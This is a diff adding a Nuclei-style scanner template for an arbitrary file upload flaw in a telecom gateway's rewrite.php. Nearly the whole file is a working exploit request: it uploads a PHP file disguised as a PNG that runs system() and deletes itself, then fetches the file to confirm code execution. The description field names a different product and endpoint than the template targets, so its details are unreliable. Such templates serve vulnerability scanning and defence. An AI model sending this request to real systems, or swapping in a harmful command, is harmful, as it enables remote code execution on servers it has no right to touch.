@@ -1,0 +1,53 @@
+id: dianxin-rewrite-fileupload
+
+info:
+  name: 电信网关配置管理系统 rewrite.php 任意文件上传漏洞
+  author: fgz
+  severity: critical
+  description: 某云eHR是大中型企业广泛采用人力资源管理系统。某云是国内顶尖的HR软件供应商，是新一代eHR系统的领导者。该系统PtFjk.mob接口处存在任意文件上传漏洞，容易导致系统被远控。
+  metadata:
+    max-request: 1
+    fofa-query: app="和丰山海-数字标牌"
+    verified: true
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+  file_content: "{{to_lower(rand_text_alpha(20))}}"
+  rboundary: "{{to_lower(rand_text_alpha(8))}}"
+requests:
+  - raw:
+      - |+
+        POST /manager/teletext/material/rewrite.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+        Connection: close
+        
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="tmp_name"; filename="{{file_name}}.php"
+        Content-Type: image/png
+        
+        <?php system("echo {{file_content}}");unlink(__FILE__);?>
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="uploadtime"
+        
+        
+        ------WebKitFormBoundary{{rboundary}}--
+
+      - |
+        GET {{name}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+    extractors:
+      - type: json
+        part: body
+        name: name
+        json:
+          - '.url'
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{file_content}}')"
